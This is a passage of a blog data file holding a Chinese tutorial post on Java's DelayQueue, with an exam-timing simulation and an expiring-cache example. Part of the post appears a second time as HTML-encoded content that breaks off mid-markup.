iterator2.next();\n            tmpStudent.setForce(true);\n            System.out.println(tmpStudent.getName()+\"===\"+tmpStudent.getDelay(TimeUnit.NANOSECONDS));\n            tmpStudent.run();\n        }\n        countDownLatch.countDown();\n    }\n    \n}\n\nclass Teacher implements Runnable{\n\n    private DelayQueue<Student> students;\n    public Teacher(DelayQueue<Student> students){\n        this.students = students;\n    }\n    \n    @Override\n    public void run() {\n        try {\n            System.out.println(\" test start\");\n            while(!Thread.interrupted()){\n            \tStudent s = students.take();\n            \tSystem.out.println(s.getName()+\"===\"+s.getDelay(TimeUnit.NANOSECONDS));\n                s.run();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n}\n```\n\n#### 场景二\n向缓存添加内容时，给每一个key设定过期时间，系统自动将超过过期时间的key清除。需要注意的是：\n1、当向缓存中添加key-value对时，如果这个key在缓存中存在并且还没有过期，需要用这个key对应的新过期时间\n2、为了能够让DelayQueue将其已保存的key删除，需要重写实现Delayed接口添加到DelayQueue的DelayedItem的hashCode函数和equals函数\n3、当缓存关闭，监控程序也应关闭，因而监控线程应当用守护线程\n\n**网上搜到的相关代码：**\n```\n/**\n *Cache.java\n *\n * Created on 2014-1-11 上午11:30:36 by sunzhenchao mychaoyue2011@163.com\n */\npublic class Cache<K, V> {\n\n    public ConcurrentHashMap<K, V> map = new ConcurrentHashMap<K, V>();\n    public DelayQueue<DelayedItem<K>> queue = new DelayQueue<DelayedItem<K>>();\n    \n    \n    public void put(K k,V v,long liveTime){\n        V v2 = map.put(k, v);\n        DelayedItem<K> tmpItem = new DelayedItem<K>(k, liveTime);\n        if (v2 != null) {\n            queue.remove(tmpItem);\n        }\n        queue.put(tmpItem);\n    }\n    \n    public Cache(){\n        Thread t = new Thread(){\n            @Override\n            public void run(){\n                dameonCheckOverdueKey();\n            }\n        };\n        t.setDaemon(true);\n        t.start();\n    }\n    \n    public void dameonCheckOverdueKey(){\n        while (true) {\n            DelayedItem<K> delayedItem = queue.poll();\n            if (delayedItem != null) {\n                map.remove(delayedItem.getT());\n                System.out.println(System.nanoTime()+\" remove \"+delayedItem.getT() +\" from cache\");\n            }\n            try {\n                Thread.sleep(300);\n            } catch (Exception e) {\n                // TODO: handle exception\n            }\n        }\n    }\n    \n    /**\n     * TODO\n     * @param args\n     * 2014-1-11 上午11:30:36\n     * @author:孙振超\n     * @throws InterruptedException \n     */\n    public static void main(String[] args) throws InterruptedException {\n        Random random = new Random();\n        int cacheNumber = 10;\n        int liveTime = 0;\n        Cache<String, Integer> cache = new Cache<String, Integer>();\n        \n        for (int i = 0; i < cacheNumber; i++) {\n            liveTime = random.nextInt(3000);\n            System.out.println(i+\"  \"+liveTime);\n            cache.put(i+\"\", i, random.nextInt(liveTime));\n            if (random.nextInt(cacheNumber) > 7) {\n                liveTime = random.nextInt(3000);\n                System.out.println(i+\"  \"+liveTime);\n                cache.put(i+\"\", i, random.nextInt(liveTime));\n            }\n        }\n\n        Thread.sleep(3000);\n        System.out.println();\n    }\n\n}\n\nclass DelayedItem<T> implements Delayed{\n\n    private T t;\n    private long liveTime ;\n    private long removeTime;\n    \n    public DelayedItem(T t,long liveTime){\n        this.setT(t);\n        this.liveTime = liveTime;\n        this.removeTime = TimeUnit.NANOSECONDS.convert(liveTime, TimeUnit.NANOSECONDS) + System.nanoTime();\n    }\n    \n    @Override\n    public int compareTo(Delayed o) {\n        if (o == null) return 1;\n        if (o == this) return  0;\n        if (o instanceof DelayedItem){\n            DelayedItem<T> tmpDelayedItem = (DelayedItem<T>)o;\n            if (liveTime > tmpDelayedItem.liveTime ) {\n                return 1;\n            }else if (liveTime == tmpDelayedItem.liveTime) {\n                return 0;\n            }else {\n                return -1;\n            }\n        }\n        long diff = getDelay(TimeUnit.NANOSECONDS) - o.getDelay(TimeUnit.NANOSECONDS);\n        return diff > 0 ? 1:diff == 0? 0:-1;\n    }\n\n    @Override\n    public long getDelay(TimeUnit unit) {\n        return unit.convert(removeTime - System.nanoTime(), unit);\n    }\n\n    public T getT() {\n        return t;\n    }\n\n    public void setT(T t) {\n        this.t = t;\n    }\n    @Override\n    public int hashCode(){\n        return t.hashCode();\n    }\n    \n    @Override\n    public boolean equals(Object object){\n        if (object instanceof DelayedItem) {\n            return object.hashCode() == hashCode() ?true:false;\n        }\n        return false;\n    }\n    \n}\n```","source":"_posts/DelayQueue使用.md","raw":"---\ntitle: DelayQueue使用\ncategories:\n  - WEB后端\ntags:\n  - concurrent\ndate: 2016-4-16 23:42:13\ntoc: false\n\n---\n\n>假设现有如下使用场景：\na) 关闭空闲连接。服务器中，有很多客户端的连接，空闲一段时间之后需要关闭之。 \nb) 缓存。缓存中的对象，超过了空闲时间，需要从缓存中移出。\nc) 任务超时处理。在网络协议滑动窗口请求应答式交互时，处理超时未响应的请求。\n\n笨办法是，使用一个后台线程，遍历所有对象，挨个检查。\n但对象数量过多时，存在性能问题，检查间隔时间不好设置，间隔时间过大，影响精确度，多小则存在效率问题。而且做不到按超时的时间顺序处理。\n\n这场景，使用DelayQueue最适合了。\nDelayed 元素的一个无界阻塞队列，只有在延迟期满时才能从中提取元素。\n该队列的头部是延迟期满后保存时间最长的Delayed元素（即最想优先处理的元素）。如果延迟都还没有期满，则队列没有头部，并且 poll 将返回 null。\n当一个元素的 getDelay(TimeUnit.NANOSECONDS) 方法返回一个小于等于 0 的值时，将发生到期。\n即使无法使用take或poll移除未到期的元素，也不会将这些元素作为正常元素对待。例如，size方法同时返回到期和未到期元素的计数。此队列不允许使 null元素。\n\n<!-- more -->\n\nDelayQueue队列中保存的是实现了Delayed接口的实现类，里面必须实现getDelay()和compareTo()方法。前者用于取DelayQueue里面的元素时判断是否到了延时时间，否则不予获取，是则获取。  compareTo()方法用于进行队列内部的排序。compareTo 方法需提供与 getDelay 方法一致的排序。\n\nDelayQueue = BlockingQueue + PriorityQueue + Delayed\nPriorityBlockingQueue = BlockingQueue + PriorityQueue\nDelayQueue的关键元素BlockingQueue、PriorityQueue、Delayed。\n可以这么说，DelayQueue是一个使用优先队列（PriorityQueue）实现的BlockingQueue，优先队列的比较基准值是时间。通过PriorityQueue，可以优先处理最紧急的元素，利用BlockingQueue，能防止不必要的不断轮询，提高了性能。在很多需要回收对象的场景都能用上。\n\n---\n\n### 代码示例\n\n#### 场景一\n模拟一个考试的日子，考试时间为120分钟，30分钟后才可交卷，当时间到了，或学生都交完卷了考试结束。主要注意的：\n1、考试时间为120分钟，30分钟后才可交卷，初始化考生完成试卷时间最小应为30分钟\n2、对于能够在120分钟内交卷的考生，如何实现这些考生交卷\n3、对于120分钟内没有完成考试的考生，在120分钟考试时间到后需要让他们强制交卷\n4、在所有的考生都交完卷后，需要将控制线程关闭\n\n**下面是自己修改了的代码：**\n```\npackage com.bbk.demo;\n\nimport java.util.Iterator;\nimport java.util.Random;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.DelayQueue;\nimport java.util.concurrent.Delayed;\nimport java.util.concurrent.TimeUnit;\n\n/**\n * DelayQueue\n * @author wasim\n * @project Demo\n * @create at 2015-10-6 下午4:37:31\n */\npublic class Exam {\n\n    public static void main(String[] args) throws InterruptedException {\n        \n        int studentNumber = 20;\n        CountDownLatch countDownLatch = new CountDownLatch(studentNumber+1);\n        DelayQueue< Student> students = new DelayQueue<Student>();\n        Random random = new Random();\n        for (int i = 0; i < studentNumber; i++) {\n            students.put(new Student(\"student\"+(i+1), 30+random.nextInt(120),countDownLatch));\n        }\n        Thread teacherThread =new Thread(new Teacher(students)); \n        students.put(new EndExam(students, 120,countDownLatch,teacherThread));\n        teacherThread.start();\n        countDownLatch.await();\n        System.out.println(\" 考试时间到，全部交卷！\");  \n    }\n\n}\n\nclass Student implements Runnable,Delayed{\n\n    private String name;\n    private long workTime;\n    private long submitTime;\n    private boolean isForce = false;\n    private CountDownLatch countDownLatch;\n    \n    public Student(){}\n    \n    public Student(String name,long workTime,CountDownLatch countDownLatch){\n        this.name = name;\n        this.workTime = workTime;\n        //提交时间 = 当前时间 + 作答时间\n        this.submitTime = TimeUnit.NANOSECONDS.convert(workTime, TimeUnit.NANOSECONDS)+System.nanoTime();\n        this.countDownLatch = countDownLatch;\n    }\n    \n    @Override\n    public int compareTo(Delayed o) {\n        // 按照作答时长正序排序（队头放的是你认为最先需要处理的元素，在这里体现为需要最先交卷，所以是正序）\n        if(o == null || ! (o instanceof Student)) return 1;\n        if(o == this) return 0;\n        Student s = (Student)o;\n        if (this.workTime > s.workTime) {\n            return 1;\n        }else if (this.workTime == s.workTime) {\n            return 0;\n        }else {\n            return -1;\n        }\n    }\n\n    @Override\n    public long getDelay(TimeUnit unit) {\n    \t// 提交时间 - 当前时间  用来判断延迟是否到期（即是否可以提交试卷，可以进行take或者poll）\n        // 返回正数：延迟还有多少时间到期。负数：延迟已经在多长时间前到期。负数代表可以take或者poll\n        return unit.convert(submitTime - System.nanoTime(),  TimeUnit.NANOSECONDS);\n    }\n\n    @Override\n    public void run() {\n        if (isForce) {\n            System.out.println(name + \" 交卷, 希望用时\" + workTime + \"分钟\"+\" ,实际用时 120分钟\" );\n        }else {\n            System.out.println(name + \" 交卷, 希望用时\" + workTime + \"分钟\"+\" ,实际用时 \"+workTime +\" 分钟\");  \n        }\n        countDownLatch.countDown();\n    }\n\n    public boolean isForce() {\n        return isForce;\n    }\n\n    public void setForce(boolean isForce) {\n        this.isForce = isForce;\n    }\n\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\n\tpublic long getWorkTime() {\n\t\treturn workTime;\n\t}\n\n\tpublic void setWorkTime(long workTime) {\n\t\tthis.workTime = workTime;\n\t}\n\n\tpublic long getSubmitTime() {\n\t\treturn submitTime;\n\t}\n\n\tpublic void setSubmitTime(long submitTime) {\n\t\tthis.submitTime = submitTime;\n\t}\n    \n}\n\nclass EndExam extends Student{\n\n    private DelayQueue<Student> students;\n    private CountDownLatch countDownLatch;\n    private Thread teacherThread;\n    \n    public EndExam(DelayQueue<Student> students, long workTime, CountDownLatch countDownLatch,Thread teacherThread) {\n        super(\"强制收卷\", workTime,countDownLatch);\n        this.students = students;\n        this.countDownLatch = countDownLatch;\n        this.teacherThread = teacherThread;\n    }\n    \n    \n    \n    @Override\n    public void run() {\n        teacherThread.interrupt();\n        Student tmpStudent;\n        for (Iterator<Student> iterator2 = students.iterator(); iterator2.hasNext();) {\n            tmpStudent = iterator2.next();\n            tmpStudent.setForce(true);\n            System.out.println(tmpStudent.getName()+\"===\"+tmpStudent.getDelay(TimeUnit.NANOSECONDS));\n            tmpStudent.run();\n        }\n        countDownLatch.countDown();\n    }\n    \n}\n\nclass Teacher implements Runnable{\n\n    private DelayQueue<Student> students;\n    public Teacher(DelayQueue<Student> students){\n        this.students = students;\n    }\n    \n    @Override\n    public void run() {\n        try {\n            System.out.println(\" test start\");\n            while(!Thread.interrupted()){\n            \tStudent s = students.take();\n            \tSystem.out.println(s.getName()+\"===\"+s.getDelay(TimeUnit.NANOSECONDS));\n                s.run();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n}\n```\n\n#### 场景二\n向缓存添加内容时，给每一个key设定过期时间，系统自动将超过过期时间的key清除。需要注意的是：\n1、当向缓存中添加key-value对时，如果这个key在缓存中存在并且还没有过期，需要用这个key对应的新过期时间\n2、为了能够让DelayQueue将其已保存的key删除，需要重写实现Delayed接口添加到DelayQueue的DelayedItem的hashCode函数和equals函数\n3、当缓存关闭，监控程序也应关闭，因而监控线程应当用守护线程\n\n**网上搜到的相关代码：**\n```\n/**\n *Cache.java\n *\n * Created on 2014-1-11 上午11:30:36 by sunzhenchao mychaoyue2011@163.com\n */\npublic class Cache<K, V> {\n\n    public ConcurrentHashMap<K, V> map = new ConcurrentHashMap<K, V>();\n    public DelayQueue<DelayedItem<K>> queue = new DelayQueue<DelayedItem<K>>();\n    \n    \n    public void put(K k,V v,long liveTime){\n        V v2 = map.put(k, v);\n        DelayedItem<K> tmpItem = new DelayedItem<K>(k, liveTime);\n        if (v2 != null) {\n            queue.remove(tmpItem);\n        }\n        queue.put(tmpItem);\n    }\n    \n    public Cache(){\n        Thread t = new Thread(){\n            @Override\n            public void run(){\n                dameonCheckOverdueKey();\n            }\n        };\n        t.setDaemon(true);\n        t.start();\n    }\n    \n    public void dameonCheckOverdueKey(){\n        while (true) {\n            DelayedItem<K> delayedItem = queue.poll();\n            if (delayedItem != null) {\n                map.remove(delayedItem.getT());\n                System.out.println(System.nanoTime()+\" remove \"+delayedItem.getT() +\" from cache\");\n            }\n            try {\n                Thread.sleep(300);\n            } catch (Exception e) {\n                // TODO: handle exception\n            }\n        }\n    }\n    \n    /**\n     * TODO\n     * @param args\n     * 2014-1-11 上午11:30:36\n     * @author:孙振超\n     * @throws InterruptedException \n     */\n    public static void main(String[] args) throws InterruptedException {\n        Random random = new Random();\n        int cacheNumber = 10;\n        int liveTime = 0;\n        Cache<String, Integer> cache = new Cache<String, Integer>();\n        \n        for (int i = 0; i < cacheNumber; i++) {\n            liveTime = random.nextInt(3000);\n            System.out.println(i+\"  \"+liveTime);\n            cache.put(i+\"\", i, random.nextInt(liveTime));\n            if (random.nextInt(cacheNumber) > 7) {\n                liveTime = random.nextInt(3000);\n                System.out.println(i+\"  \"+liveTime);\n                cache.put(i+\"\", i, random.nextInt(liveTime));\n            }\n        }\n\n        Thread.sleep(3000);\n        System.out.println();\n    }\n\n}\n\nclass DelayedItem<T> implements Delayed{\n\n    private T t;\n    private long liveTime ;\n    private long removeTime;\n    \n    public DelayedItem(T t,long liveTime){\n        this.setT(t);\n        this.liveTime = liveTime;\n        this.removeTime = TimeUnit.NANOSECONDS.convert(liveTime, TimeUnit.NANOSECONDS) + System.nanoTime();\n    }\n    \n    @Override\n    public int compareTo(Delayed o) {\n        if (o == null) return 1;\n        if (o == this) return  0;\n        if (o instanceof DelayedItem){\n            DelayedItem<T> tmpDelayedItem = (DelayedItem<T>)o;\n            if (liveTime > tmpDelayedItem.liveTime ) {\n                return 1;\n            }else if (liveTime == tmpDelayedItem.liveTime) {\n                return 0;\n            }else {\n                return -1;\n            }\n        }\n        long diff = getDelay(TimeUnit.NANOSECONDS) - o.getDelay(TimeUnit.NANOSECONDS);\n        return diff > 0 ? 1:diff == 0? 0:-1;\n    }\n\n    @Override\n    public long getDelay(TimeUnit unit) {\n        return unit.convert(removeTime - System.nanoTime(), unit);\n    }\n\n    public T getT() {\n        return t;\n    }\n\n    public void setT(T t) {\n        this.t = t;\n    }\n    @Override\n    public int hashCode(){\n        return t.hashCode();\n    }\n    \n    @Override\n    public boolean equals(Object object){\n        if (object instanceof DelayedItem) {\n            return object.hashCode() == hashCode() ?true:false;\n        }\n        return false;\n    }\n    \n}\n```","slug":"DelayQueue使用","published":1,"updated":"2016-11-17T11:59:42.662Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulat000lgwtm0fz114qc","content":"<blockquote>\n<p>&#x5047;&#x8BBE;&#x73B0;&#x6709;&#x5982;&#x4E0B;&#x4F7F;&#x7528;&#x573A;&#x666F;&#xFF1A;<br>a) &#x5173;&#x95ED;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;&#x3002;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x7A7A;&#x95F2;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4E4B;&#x540E;&#x9700;&#x8981;&#x5173;&#x95ED;&#x4E4B;&#x3002;<br>b) &#x7F13;&#x5B58;&#x3002;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x8D85;&#x8FC7;&#x4E86;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF0C;&#x9700;&#x8981;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x79FB;&#x51FA;&#x3002;<br>c) &#x4EFB;&#x52A1;&#x8D85;&#x65F6;&#x5904;&#x7406;&#x3002;&#x5728;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x6ED1;&#x52A8;&#x7A97;&#x53E3;&#x8BF7;&#x6C42;&#x5E94;&#x7B54;&#x5F0F;&#x4EA4;&#x4E92;&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x8D85;&#x65F6;&#x672A;&#x54CD;&#x5E94;&#x7684;&#x8BF7;&#x6C42;&#x3002;</p>\n</blockquote>\n<p>&#x7B28;&#x529E;&#x6CD5;&#x662F;&#xFF0C;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#xFF0C;&#x904D;&#x5386;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#xFF0C;&#x6328;&#x4E2A;&#x68C0;&#x67E5;&#x3002;<br>&#x4F46;&#x5BF9;&#x8C61;&#x6570;&#x91CF;&#x8FC7;&#x591A;&#x65F6;&#xFF0C;&#x5B58;&#x5728;&#x6027;&#x80FD;&#x95EE;&#x9898;&#xFF0C;&#x68C0;&#x67E5;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x4E0D;&#x597D;&#x8BBE;&#x7F6E;&#xFF0C;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#x8FC7;&#x5927;&#xFF0C;&#x5F71;&#x54CD;&#x7CBE;&#x786E;&#x5EA6;&#xFF0C;&#x591A;&#x5C0F;&#x5219;&#x5B58;&#x5728;&#x6548;&#x7387;&#x95EE;&#x9898;&#x3002;&#x800C;&#x4E14;&#x505A;&#x4E0D;&#x5230;&#x6309;&#x8D85;&#x65F6;&#x7684;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#x5904;&#x7406;&#x3002;</p>\n<p>&#x8FD9;&#x573A;&#x666F;&#xFF0C;&#x4F7F;&#x7528;DelayQueue&#x6700;&#x9002;&#x5408;&#x4E86;&#x3002;<br>Delayed &#x5143;&#x7D20;&#x7684;&#x4E00;&#x4E2A;&#x65E0;&#x754C;&#x963B;&#x585E;&#x961F;&#x5217;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x65F6;&#x624D;&#x80FD;&#x4ECE;&#x4E2D;&#x63D0;&#x53D6;&#x5143;&#x7D20;&#x3002;<br>&#x8BE5;&#x961F;&#x5217;&#x7684;&#x5934;&#x90E8;&#x662F;&#x5EF6;&#x8FDF;&#x671F;&#x6EE1;&#x540E;&#x4FDD;&#x5B58;&#x65F6;&#x95F4;&#x6700;&#x957F;&#x7684;Delayed&#x5143;&#x7D20;&#xFF08;&#x5373;&#x6700;&#x60F3;&#x4F18;&#x5148;&#x5904;&#x7406;&#x7684;&#x5143;&#x7D20;&#xFF09;&#x3002;&#x5982;&#x679C;&#x5EF6;&#x8FDF;&#x90FD;&#x8FD8;&#x6CA1;&#x6709;&#x671F;&#x6EE1;&#xFF0C;&#x5219;&#x961F;&#x5217;&#x6CA1;&#x6709;&#x5934;&#x90E8;&#xFF0C;&#x5E76;&#x4E14; poll &#x5C06;&#x8FD4;&#x56DE; null&#x3002;<br>&#x5F53;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684; getDelay(TimeUnit.NANOSECONDS) &#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E; 0 &#x7684;&#x503C;&#x65F6;&#xFF0C;&#x5C06;&#x53D1;&#x751F;&#x5230;&#x671F;&#x3002;<br>&#x5373;&#x4F7F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;take&#x6216;poll&#x79FB;&#x9664;&#x672A;&#x5230;&#x671F;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5C06;&#x8FD9;&#x4E9B;&#x5143;&#x7D20;&#x4F5C;&#x4E3A;&#x6B63;&#x5E38;&#x5143;&#x7D20;&#x5BF9;&#x5F85;&#x3002;&#x4F8B;&#x5982;&#xFF0C;size&#x65B9;&#x6CD5;&#x540C;&#x65F6;&#x8FD4;&#x56DE;&#x5230;&#x671F;&#x548C;&#x672A;&#x5230;&#x671F;&#x5143;&#x7D20;&#x7684;&#x8BA1;&#x6570;&#x3002;&#x6B64;&#x961F;&#x5217;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F; null&#x5143;&#x7D20;&#x3002;</p>\n<a id=\"more\"></a>\n<p>DelayQueue&#x961F;&#x5217;&#x4E2D;&#x4FDD;&#x5B58;&#x7684;&#x662F;&#x5B9E;&#x73B0;&#x4E86;Delayed&#x63A5;&#x53E3;&#x7684;&#x5B9E;&#x73B0;&#x7C7B;&#xFF0C;&#x91CC;&#x9762;&#x5FC5;&#x987B;&#x5B9E;&#x73B0;getDelay()&#x548C;compareTo()&#x65B9;&#x6CD5;&#x3002;&#x524D;&#x8005;&#x7528;&#x4E8E;&#x53D6;DelayQueue&#x91CC;&#x9762;&#x7684;&#x5143;&#x7D20;&#x65F6;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5230;&#x4E86;&#x5EF6;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5426;&#x5219;&#x4E0D;&#x4E88;&#x83B7;&#x53D6;&#xFF0C;&#x662F;&#x5219;&#x83B7;&#x53D6;&#x3002;  compareTo()&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x8FDB;&#x884C;&#x961F;&#x5217;&#x5185;&#x90E8;&#x7684;&#x6392;&#x5E8F;&#x3002;compareTo &#x65B9;&#x6CD5;&#x9700;&#x63D0;&#x4F9B;&#x4E0E; getDelay &#x65B9;&#x6CD5;&#x4E00;&#x81F4;&#x7684;&#x6392;&#x5E8F;&#x3002;</p>\n<p>DelayQueue = BlockingQueue + PriorityQueue + Delayed<br>PriorityBlockingQueue = BlockingQueue + PriorityQueue<br>DelayQueue&#x7684;&#x5173;&#x952E;&#x5143;&#x7D20;BlockingQueue&#x3001;PriorityQueue&#x3001;Delayed&#x3002;<br>&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x8BF4;&#xFF0C;DelayQueue&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;&#x4F18;&#x5148;&#x961F;&#x5217;&#xFF08;PriorityQueue&#xFF09;&#x5B9E;&#x73B0;&#x7684;BlockingQueue&#xFF0C;&#x4F18;&#x5148;&#x961F;&#x5217;&#x7684;&#x6BD4;&#x8F83;&#x57FA;&#x51C6;&#x503C;&#x662F;&#x65F6;&#x95F4;&#x3002;&#x901A;&#x8FC7;PriorityQueue&#xFF0C;&#x53EF;&#x4EE5;&#x4F18;&#x5148;&#x5904;&#x7406;&#x6700;&#x7D27;&#x6025;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5229;&#x7528;BlockingQueue&#xFF0C;&#x80FD;&#x9632;&#x6B62;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x4E0D;&#x65AD;&#x8F6E;&#x8BE2;&#xFF0C;&#x63D0;&#x9AD8;&#x4E86;&#x6027;&#x80FD;&#x3002;&#x5728;&#x5F88;&#x591A;&#x9700;&#x8981;&#x56DE;&#x6536;&#x5BF9;&#x8C61;&#x7684;&#x573A;&#x666F;&#x90FD;&#x80FD;&#x7528;&#x4E0A;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4EE3;&#x7801;&#x793A;&#x4F8B;\"><a href=\"#&#x4EE3;&#x7801;&#x793A;&#x4F8B;\" class=\"headerlink\" title=\"&#x4EE3;&#x7801;&#x793A;&#x4F8B;\"></a>&#x4EE3;&#x7801;&#x793A;&#x4F8B;</h3><h4 id=\"&#x573A;&#x666F;&#x4E00;\"><a href=\"#&#x573A;&#x666F;&#x4E00;\" class=\"headerlink\" title=\"&#x573A;&#x666F;&#x4E00;\"></a>&#x573A;&#x666F;&#x4E00;</h4><p>&#x6A21;&#x62DF;&#x4E00;&#x4E2A;&#x8003;&#x8BD5;&#x7684;&#x65E5;&#x5B50;&#xFF0C;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x4E3A;120&#x5206;&#x949F;&#xFF0C;30&#x5206;&#x949F;&#x540E;&#x624D;&#x53EF;&#x4EA4;&#x5377;&#xFF0C;&#x5F53;&#x65F6;&#x95F4;&#x5230;&#x4E86;&#xFF0C;&#x6216;&#x5B66;&#x751F;&#x90FD;&#x4EA4;&#x5B8C;&#x5377;&#x4E86;&#x8003;&#x8BD5;&#x7ED3;&#x675F;&#x3002;&#x4E3B;&#x8981;&#x6CE8;&#x610F;&#x7684;&#xFF1A;<br>1&#x3001;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x4E3A;120&#x5206;&#x949F;&#xFF0C;30&#x5206;&#x949F;&#x540E;&#x624D;&#x53EF;&#x4EA4;&#x5377;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x8003;&#x751F;&#x5B8C;&#x6210;&#x8BD5;&#x5377;&#x65F6;&#x95F4;&#x6700;&#x5C0F;&#x5E94;&#x4E3A;30&#x5206;&#x949F;<br>2&#x3001;&#x5BF9;&#x4E8E;&#x80FD;&#x591F;&#x5728;120&#x5206;&#x949F;&#x5185;&#x4EA4;&#x5377;&#x7684;&#x8003;&#x751F;&#xFF0C;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x8FD9;&#x4E9B;&#x8003;&#x751F;&#x4EA4;&#x5377;<br>3&#x3001;&#x5BF9;&#x4E8E;120&#x5206;&#x949F;&#x5185;&#x6CA1;&#x6709;&#x5B8C;&#x6210;&#x8003;&#x8BD5;&#x7684;&#x8003;&#x751F;&#xFF0C;&#x5728;120&#x5206;&#x949F;&#x8003;&#x8BD5;&#x65F6;&#x95F4;&#x5230;&#x540E;&#x9700;&#x8981;&#x8BA9;&#x4ED6;&#x4EEC;&#x5F3A;&#x5236;&#x4EA4;&#x5377;<br>4&#x3001;&#x5728;&#x6240;&#x6709;&#x7684;&#x8003;&#x751F;&#x90FD;&#x4EA4;&#x5B8C;&#x5377;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x5173;&#x95ED;</p>\n<p><strong>&#x4E0B;&#x9762;&#x662F;&#x81EA;&#x5DF1;&#x4FEE;&#x6539;&#x4E86;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span 